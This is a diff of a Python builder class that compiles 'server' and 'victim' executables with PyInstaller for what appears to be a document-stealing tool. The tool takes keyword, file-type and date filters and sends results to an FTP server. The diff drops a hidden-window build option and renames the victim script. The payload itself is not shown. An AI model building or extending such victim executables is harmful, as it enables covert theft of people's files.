@@ -15,16 +15,10 @@ class DocPullerGenerator:
         self.server_ip = server_ip
         self.server_port = server_port
         self.DOCPULLER_USB_PATH = 'Generator/docpullerscrip.py'
-        self.DOCPULLER_FTP_SERVER_PATH = 'Generator/serverscrip.py'
-        self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/victimscrip.py'
+        self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/clientscript.py'
+        self.DOCPULLER_FTP_SERVER_PATH = 'Generator/serverscript.py'
 
-        # Specify additional PyInstaller options if needed
-        self.options = [
-            "--onefile",
-            "--noconsole",
-            f"--distpath={self.save_dir}",
-            f'--add-data /DocPullerScripts'
-        ]
+        # Specify additional PyInstaller options if neede
 
         ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()
 
@@ -39,13 +33,13 @@ class DocPullerGenerator:
             print('done!')
 
         else:
-            print('genarating server exe')
-
-            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}",
-                       self.DOCPULLER_FTP_SERVER_PATH]
-            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                   universal_newlines=True)
-            nig.communicate()
+            # print('genarating server exe')
+            #
+            # command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}",
+            #            self.DOCPULLER_FTP_SERVER_PATH]
+            # nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            #                        universal_newlines=True)
+            # nig.communicate()
 
             print('genarating victim exe')
 
